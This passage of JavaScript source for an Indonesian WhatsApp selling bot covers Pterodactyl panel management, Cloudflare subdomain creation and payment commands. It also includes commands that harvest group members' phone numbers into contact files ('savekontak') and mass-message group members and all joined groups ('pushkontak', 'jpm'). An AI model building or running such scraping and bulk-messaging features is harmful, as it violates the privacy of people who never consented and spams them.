await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("skyzoo|ipserver"))
if (!text.split("|")) return m.reply(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addpre": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah user premium ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpre": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *乂 List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpre": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus user premium ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
  if (m.isGroup) return
  if (db.users[m.sender].status_deposit == false) return 
  db.users[m.sender].status_deposit = false
  if (db.users[m.sender].deposit_data) {
      await conn.sendMessage(m.chat, {text: "Berhasil membatalkan deposit ✅"}, {quoted: db.users[m.sender].deposit_data.msg})
      await conn.sendMessage(m.chat, { delete: db.users[m.sender].deposit_data.msg.key })
      delete db.users[m.sender].deposit_data
  } else {
      return m.reply("Berhasil membatalkan deposit ✅")
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "produk": case "listproduk": case "list": {
await conn.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Andi spnb - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Andi spnb - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await conn.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await conn.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
